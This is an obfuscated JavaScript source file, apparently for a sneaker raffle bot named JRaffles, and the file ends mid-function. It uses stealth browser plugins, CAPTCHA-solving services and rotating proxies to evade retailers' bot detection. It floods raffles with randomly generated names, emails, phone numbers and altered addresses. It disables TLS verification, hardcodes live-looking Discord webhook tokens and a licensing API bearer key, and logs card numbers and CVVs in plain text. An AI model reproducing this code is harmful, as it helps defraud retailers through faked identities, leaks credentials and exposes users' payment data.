process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x1c5c24 = require('node-imap'), _0x5b2ccc = require('util')['inspect'];
const _0x39d64d = require('mailparser')['simpleParser'], { EmbedBuilder: _0x48a049 } = require('discord.js');
var _0x3a5396 = require('exe');
const { execFile: _0x4b5804 } = require('child_process'), _0x59f17d = require('puppeteer-extra'), _0x4d8fa8 = require('puppeteer-extra-plugin-recaptcha'), _0x1f6810 = require('puppeteer-extra-plugin-stealth'), _0xe1d9e = require('chalk'), _0x2167ba = require('node-bash-title'), _0x5b2323 = require('fs'), _0x37f9ff = require('axios'), _0x2faa61 = require('papaparse');
var _0x2c3f53 = require('random-name');
const _0x4cfc83 = require('request');
var _0x242d5a = require('prompt');
const _0x1da69d = _0x4cfc83['jar']();
var _0x1c5a09 = {};
const _0x4c373b = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4bdf2d = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x40d1aa = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2b09bf = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x45171d = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1f072f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x589ca7 = 'https://discord.com/api/webhooks/', _0x4caa2e = '' + _0x589ca7 + _0x40d1aa, _0x540a14 = '' + _0x589ca7 + _0x2b09bf, _0x5df164 = '' + _0x589ca7 + _0x4c373b, _0x166efb = '' + _0x589ca7 + _0x4bdf2d, _0x53e58f = '' + _0x589ca7 + _0x45171d, _0x51d91d = '' + _0x589ca7 + _0x1f072f;
const _0x869104 = JSON['parse'](_0x5b2323['readFileSync']('../package.json', 'utf-8')), _0x18cd5d = _0x869104['version'];
var _0x5f3c92, _0x3e3b21, _0x2a5f9c, _0x2e3ced, _0x1a8e35, _0xb2f9e4, _0x50a8aa, _0x2cbdae;
const _0x3c57c4 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x456666 = ![];
const _0x50985e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x6cc5b0 = '0123456789';
var _0x351978 = _0x50985e['split']('');
const _0x3d26fd = require('auto-git-update'), { PageEmittedEvents: _0x3a31dd } = require('puppeteer'), { getRandomValues: _0x384e18 } = require('crypto'), { resolve: _0x2c506b } = require('path'), { Console: _0x1ee1f7 } = require('console'), _0xc94186 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3ee0f4 = new _0x3d26fd(_0xc94186);
async function _0x534b78() {
    _0x1a8e35 = _0x5b2323['readdirSync']('../proxies'), _0x2e3ced = _0x5b2323['readdirSync']('../tasks'), !_0x5b2323['existsSync']('../accounts/fenom.csv') && _0x5b2323['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x5b2323['existsSync']('../accounts/bstn.csv') && _0x5b2323['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x5b2323['existsSync']('../failed-tasks.csv') && _0x5b2323['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x5b2323['existsSync']('../successful-tasks.csv') && _0x5b2323['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x1c5a09 = JSON['parse'](_0x5b2323['readFileSync']('../settings.json', 'utf-8')), !_0x1c5a09['delay'] && (_0x1c5a09['delay'] = 0x3c, _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), !_0x1c5a09['masterMail'] && (_0x1c5a09['masterMail'] = 'yourmail@gmail.com', _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), !_0x1c5a09['masterPassword'] && (_0x1c5a09['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), !_0x1c5a09['captchaKey'] && (_0x1c5a09['captchaKey'] = '', _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), !_0x1c5a09['useRandomProxy'] && (_0x1c5a09['useRandomProxy'] = !![], _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), !_0x1c5a09['webhook'] && (_0x1c5a09['webhook'] = '', _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09, null, 0x2))), _0x1c5a09['delay'] <= 0x1388 && (_0x1c5a09['delay'] = _0x1c5a09['delay'] * 0x3e8), _0x1c5a09['MahaDelay'] = _0x1c5a09['delay'], _0x589ca7 = _0x1c5a09['webhook'], _0xb2f9e4 = _0x1c5a09['licenseKey'];
}
let _0x2992aa, _0x2515e4 = [], _0x4f490c;
const _0xbec2fc = _0x5da362 => new Promise(_0x662b43 => setTimeout(_0x662b43, _0x5da362));
function _0x3da0ff(_0xe4ea31, _0x2093da) {
    return Math['floor'](Math['random']() * (_0x2093da - _0xe4ea31 + 0x1) + _0xe4ea31);
}
async function _0x140329(_0x1cc88e) {
    return _0x37f9ff['get']('https://api.hyper.co/v4/licenses/' + _0x1cc88e, { 'headers': { 'Authorization': 'Bearer\x20' + _0x3c57c4 } })['then'](_0x11087 => _0x11087['data'])['catch'](() => null);
}
;
async function _0x3e287c(_0x5bc706) {
    console['clear']();
    if (_0x5bc706 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x5a2cdd = await _0x242d5a['get']('License');
        if (_0x5a2cdd['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xbec2fc(0xbb8), _0x3e287c(_0x5bc706);
        _0x5bc706 = _0x5a2cdd['License'], _0x1c5a09['licenseKey'] = _0x5bc706, _0xb2f9e4 = _0x5bc706, _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09));
    }
    console['log']('Checking\x20license\x20' + _0xb2f9e4 + '...'), await _0xbec2fc(0x320);
    const _0x405090 = await _0x140329(_0x5bc706);
    _0x50a8aa = JSON['stringify'](_0x405090['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2cbdae = JSON['stringify'](_0x405090['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x405090)
        return console['log']('License\x20not\x20found');
    if (!_0x405090['user'])
        return console['log']('License\x20not\x20bound');
    return _0x405090['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x456666 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x456666 = ![]);
}
async function _0x308776() {
    var _0x5c4b04 = await _0x242d5a['get']('Module');
    return console['clear'](), _0x5c4b04['Module'];
}
;
async function _0x236efe() {
    var _0x2633a9 = await _0x242d5a['get']('Setting');
    return console['clear'](), _0x2633a9['Setting'];
}
async function _0x1a2da6() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x509589 = 0x0; _0x509589 < _0x2e3ced['length']; _0x509589++) {
        console['log']('\x20(' + _0x509589 + ')\x20' + _0x2e3ced[_0x509589]);
    }
    console['log']('');
    var _0x1265b2 = await _0x242d5a['get']('Task');
    if (_0x1265b2['Task'] > _0x2e3ced['length'] - 0x1 || isNaN(_0x1265b2['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xbec2fc(0x3e8), _0x1a2da6();
    var _0x44d555 = _0x5b2323['readFileSync']('../tasks/' + _0x2e3ced[_0x1265b2['Task']], 'utf-8');
    return _0x2a5f9c = _0x2faa61['parse'](_0x44d555, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xe1d9e['blue'](_0x2e3ced[_0x1265b2['Task']])), _0x5f3c92 = _0x2e3ced[_0x1265b2['Task']], _0x2a5f9c;
}
async function _0x34d513() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x11d3e8 = 0x0; _0x11d3e8 < _0x1a8e35['length']; _0x11d3e8++) {
        console['log']('\x20(' + _0x11d3e8 + ')\x20' + _0x1a8e35[_0x11d3e8]);
    }
    console['log']('');
    var _0x52d188 = await _0x242d5a['get']('Proxies');
    if (_0x52d188['Proxies'] > _0x1a8e35['length'] - 0x1 || isNaN(_0x52d188['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xbec2fc(0x3e8), _0x34d513();
    var _0x1e56c6 = _0x5b2323['readFileSync']('../proxies/' + _0x1a8e35[_0x52d188['Proxies']], 'utf-8')['split']('\x0a');
    let _0x5b2a3d = _0x1e56c6['map']((_0x2b02fa, _0x5c3e87) => {
        sanatizeProxy = _0x2b02fa['replace']('\x0d', '');
        if (_0x1e56c6[_0x5c3e87 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3e3b21 = _0x1a8e35[_0x52d188['Proxies']], console['clear'](), _0x5b2a3d;
}
async function _0x256c43() {
    var _0x49f16f = await _0x242d5a['get']('Value');
    return console['clear'](), _0x49f16f['Value'];
}
async function _0x8ae395(_0x34ff13) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x44e0d5 = 0x0; _0x44e0d5 < _0x34ff13['length']; _0x44e0d5++) {
        console['log']('\x20(' + _0x44e0d5 + ')\x20[' + _0x34ff13[_0x44e0d5]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x14b8dd = await _0x242d5a['get']('Module');
    return _0x14b8dd['Module'];
}
async function _0xaefec4() {
    var _0x37407b = await _0x242d5a['get']('Password');
    return console['clear'](), _0x37407b['Password'];
}
;
async function _0x12eab5() {
    var _0x1f6b85 = await _0x242d5a['get']('Links');
    return _0x1f6b85['Links'];
}
;
async function _0x1fe9e8() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x4275e4 = 0x0; _0x4275e4 < _0x2515e4['length']; _0x4275e4++) {
        console['log']('\x20(' + _0x4275e4 + ')\x20' + _0x2515e4[_0x4275e4]);
    }
    ;
    console['log']();
    let _0x3a955a = await _0x242d5a['get']('Product');
    return console['clear'](), _0x3a955a['Product'];
}
;
function _0x27df86() {
    var _0x288232 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x288232;
}
;
function _0x14cede() {
    var _0x3bd309 = new Date(Date['now']())['toLocaleString']();
    return _0x3bd309['replace'](',', '');
}
async function _0x4f1a4a(_0x2ccb7c, _0x11c304) {
    let _0x270336 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x18cd5d != 'devkey') {
        await _0x37f9ff['post'](_0x2ccb7c, _0x11c304, _0x270336);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x597409(_0x2c0024, _0x386a99, _0x5b4e90, _0x4f319e, _0x1ba848) {
    if (!_0x4f319e && _0x5b4e90 == 'dev') {
        var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x386a99['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x386a99['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2c0024['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x1c5a09['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x50a8aa,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2c0024['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x18cd5d,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2c513e['data'];
    } else {
        if (_0x4f319e && _0x5b4e90 == 'dev') {
            var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x386a99['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x50a8aa,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x386a99['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2c0024['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x1c5a09['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1ba848,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2c0024['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x18cd5d,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2c513e['data'];
        } else {
            if (_0x5b4e90 == 'pub') {
                var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x386a99['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x386a99['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2c0024['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x1c5a09['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2c0024['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x18cd5d,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2c513e['data'];
            } else {
                if (_0x5b4e90 == 'acc' && !_0x4f319e) {
                    var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x386a99['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x50a8aa,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x386a99['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x1c5a09['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x18cd5d,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2c513e['data'];
                } else {
                    if (_0x5b4e90 == 'acc' && _0x4f319e) {
                        var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x386a99['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x50a8aa,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1ba848,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x386a99['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x1c5a09['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x18cd5d,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2c513e['data'];
                    } else {
                        if (_0x5b4e90 == 'open') {
                            var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x2cbdae)['addFields']({
                                'name': 'User',
                                'value': '' + _0x50a8aa,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x18cd5d,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2c513e['data'];
                        } else {
                            if (!_0x4f319e && _0x5b4e90 == 'ver') {
                                var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x386a99['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x50a8aa,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x386a99['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x1c5a09['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x18cd5d,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2c513e['data'];
                            } else {
                                if (_0x4f319e && _0x5b4e90 == 'ver') {
                                    var _0x2c513e = new _0x48a049()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x386a99['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x50a8aa,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1ba848,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x386a99['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x1c5a09['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x18cd5d,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2c513e['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x200aab(_0x3e21d6, _0x1203ab) {
    var _0x199b41 = _0x3e21d6[_0x1203ab]['Address1']['split'](''), _0x50468f = _0x3e21d6[_0x1203ab]['Address2']['split'](''), _0x4035f7 = _0x3e21d6[_0x1203ab]['Email']['split']('@');
    for (var _0x449897 = 0x0; _0x449897 < _0x199b41['length']; _0x449897++) {
        if (_0x199b41[_0x449897] == 'X') {
            var _0x18d539 = Math['round'](Math['random']() * (_0x50985e['length'] - 0x1));
            _0x199b41[_0x449897] = _0x351978[_0x18d539];
        }
    }
    ;
    for (var _0x449897 = 0x0; _0x449897 < _0x50468f['length']; _0x449897++) {
        if (_0x50468f[_0x449897] == 'X') {
            var _0x18d539 = Math['round'](Math['random']() * (_0x50985e['length'] - 0x1));
            _0x50468f[_0x449897] = _0x351978[_0x18d539];
        }
    }
    ;
    _0x3e21d6[_0x1203ab]['FirstName'] == 'RANDOM' && (_0x3e21d6[_0x1203ab]['FirstName'] = _0x2c3f53['first']());
    _0x3e21d6[_0x1203ab]['LastName'] == 'RANDOM' && (_0x3e21d6[_0x1203ab]['LastName'] = _0x2c3f53['last']());
    _0x4035f7[0x0] == 'RANDOM' ? _0x4035f7[0x0] = '' + _0x2c3f53['first']() + _0x2c3f53['last']() + _0x3da0ff(0x1, 0x270f) + '@' : _0x4035f7[0x0] = _0x4035f7[0x0] + '@';
    _0x3e21d6[_0x1203ab]['Email'] = _0x4035f7['join'](''), _0x3e21d6[_0x1203ab]['Address1'] = _0x199b41['join'](''), _0x3e21d6[_0x1203ab]['Address2'] = _0x50468f['join']('');
    _0x3e21d6[_0x1203ab]['Phone'] == 'RANDOM' && (_0x3e21d6[_0x1203ab]['Phone'] = '0' + _0x3da0ff(0x5f5e100, 0x3b9ac9ff));
    if (_0x3e21d6[_0x1203ab]['Follower'] == 'RANDOM') {
        var _0x269f42 = _0x3da0ff(0x1, 0x270f);
        _0x3e21d6[_0x1203ab]['Follower'] = '' + _0x2c3f53['first']() + _0x2c3f53['last']() + _0x269f42 + '\x20';
    }
    _0x3e21d6[_0x1203ab]['HouseNumber'] == 'RANDOM' && (_0x3e21d6[_0x1203ab]['HouseNumber'] = _0x3da0ff(0x1, 0xc8));
    if (_0x3e21d6[_0x1203ab]['Address1'] == 'RANDOM') {
        var _0xea94b8 = Math['round'](Math['random']() * (_0x50985e['length'] - 0x1)), _0x45e215 = _0x351978[_0xea94b8];
        _0x3e21d6[_0x1203ab]['Address1'] = _0x2c3f53['last']() + 'straat', _0x3e21d6[_0x1203ab]['Zip'] == '' && (_0x3e21d6[_0x1203ab]['Postcode'] = _0x3da0ff(0x3e8, 0x270f) + '\x20' + _0x45e215 + _0x45e215, _0x3e21d6[_0x1203ab]['Zip'] = _0x3e21d6[_0x1203ab]['Postcode']), _0x3e21d6[_0x1203ab]['HouseNumber'] = '' + _0x3da0ff(0x1, 0xc8);
    }
    return;
}
;
async function _0x176a1f(_0xae8e42, _0x3c35de) {
    _0x5b2323['appendFileSync']('../failed-tasks.csv', _0x14cede() + ',' + _0x3c35de['store'] + ',' + _0x3c35de['name'] + ',' + _0xae8e42['Url'] + ',' + _0xae8e42['Size'] + ',' + _0xae8e42['Follower'] + ',' + _0xae8e42['FirstName'] + ',' + _0xae8e42['LastName'] + ',' + _0xae8e42['Address1'] + ',' + _0xae8e42['Address2'] + ',' + _0xae8e42['HouseNumber'] + ',' + _0xae8e42['Zip'] + ',' + _0xae8e42['City'] + ',' + _0xae8e42['State'] + ',' + _0xae8e42['Country'] + ',' + _0xae8e42['Phone'] + ',' + _0xae8e42['Email'] + ',' + _0xae8e42['Password'] + ',' + _0xae8e42['PaymentMethod'] + ',' + _0xae8e42['CardType'] + ',' + _0xae8e42['NameOnCard'] + ',' + _0xae8e42['CardNumber'] + ',' + _0xae8e42['ExpiryDate'] + ',' + _0xae8e42['CVV'] + ',' + _0xae8e42['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x498d8e(_0x23807a, _0x217837) {
    _0x5b2323['appendFileSync']('../successful-tasks.csv', _0x14cede() + ',' + _0x217837['store'] + ',' + _0x217837['name'] + ',' + _0x23807a['Url'] + ',' + _0x23807a['Size'] + ',' + _0x23807a['Follower'] + ',' + _0x23807a['FirstName'] + ',' + _0x23807a['LastName'] + ',' + _0x23807a['Address1'] + ',' + _0x23807a['Address2'] + ',' + _0x23807a['HouseNumber'] + ',' + _0x23807a['Zip'] + ',' + _0x23807a['City'] + ',' + _0x23807a['State'] + ',' + _0x23807a['Country'] + ',' + _0x23807a['Phone'] + ',' + _0x23807a['Email'] + ',' + _0x23807a['Password'] + ',' + _0x23807a['PaymentMethod'] + ',' + _0x23807a['CardType'] + ',' + _0x23807a['NameOnCard'] + ',' + _0x23807a['CardNumber'] + ',' + _0x23807a['ExpiryDate'] + ',' + _0x23807a['CVV'] + ',' + _0x23807a['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x2a199d() {
    let _0x11a4c9 = proxyFile['split']('\x0a'), _0x32b622 = _0x11a4c9['map']((_0x6e742d, _0x2acb89) => {
        sanatizeProxy = _0x6e742d['replace']('\x0d', '');
        if (_0x11a4c9[_0x2acb89 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x32b622;
}
;
async function _0x8d4527(_0x45dc64) {
    var _0x1bf5d8 = _0x45dc64[0x1]['split'](':');
    const _0x24e860 = await _0x59f17d['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x1bf5d8[0x0] + ':' + _0x1bf5d8[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x15a895 = await _0x24e860['newPage']();
        await _0x15a895['authenticate']({
            'username': '' + _0x1bf5d8[0x2],
            'password': '' + _0x1bf5d8[0x3]
        }), console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x15a895['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x15a895['setRequestInterception'](!![]), _0x15a895['on']('request', _0x3c23fa => {
            _0x3c23fa['resourceType']() === 'image' || _0x3c23fa['resourceType']() === 'font' || _0x3c23fa['resourceType']() === 'media' ? _0x3c23fa['abort']() : _0x3c23fa['continue']();
        }), await _0x15a895['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x15a895['waitForTimeout'](0xbb8), await _0x15a895['waitForSelector']('.product-card');
        const _0x194ffd = await _0x15a895['$$eval']('a.product-card', _0x36499c => {
            return _0x36499c['map'](_0x58c18a => _0x58c18a['href']);
        });
        return _0x2515e4 = _0x194ffd;
    } catch (_0x55fc20) {
        console['log']('\x20' + _0x55fc20);
    } finally {
        _0x24e860['close'](), console['clear']();
    }
}
;
async function _0x225582(_0x57d1b0, _0x4696f9) {
    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1c5a09['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x40451f = 0x0; _0x40451f < bouncewear['length']; _0x40451f++) {
        await _0x200aab(bouncewear, _0x40451f);
        if (bouncewear[_0x40451f]['Email'] == '' || bouncewear[_0x40451f]['Password'] == '' || bouncewear[_0x40451f]['FirstName'] == '' || bouncewear[_0x40451f]['LastName'] == '') {
            console['log'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1c5a09['useRandomProxy'] = ![])
            var _0x30137b = _0x2a199d()[_0x40451f]['split'](':');
        else
            var _0x5395ef = Math['round'](Math['random']() * (_0x2a199d()['length'] - 0x1)), _0x30137b = _0x2a199d()[_0x5395ef]['split'](':');
        const _0x3c121a = await _0x59f17d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x30137b[0x0] + ':' + _0x30137b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2580f9 = await _0x3c121a['newPage']();
            await _0x2580f9['authenticate']({
                'username': '' + _0x30137b[0x2],
                'password': '' + _0x30137b[0x3]
            }), console['log'](_0x27df86() + '\x20[' + _0x4696f9['name'] + ']\x20Task\x20' + (_0x40451f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2580f9['setRequestInterception'](!![]), _0x2580f9['on']('request', _0x438b25 => {
                _0x438b25['resourceType']() === 'image' || _0x438b25['resourceType']() === 'font' || _0x438b25['resourceType']() === 'media' ? _0x438b25['abort']() : _0x438b25['continue']();
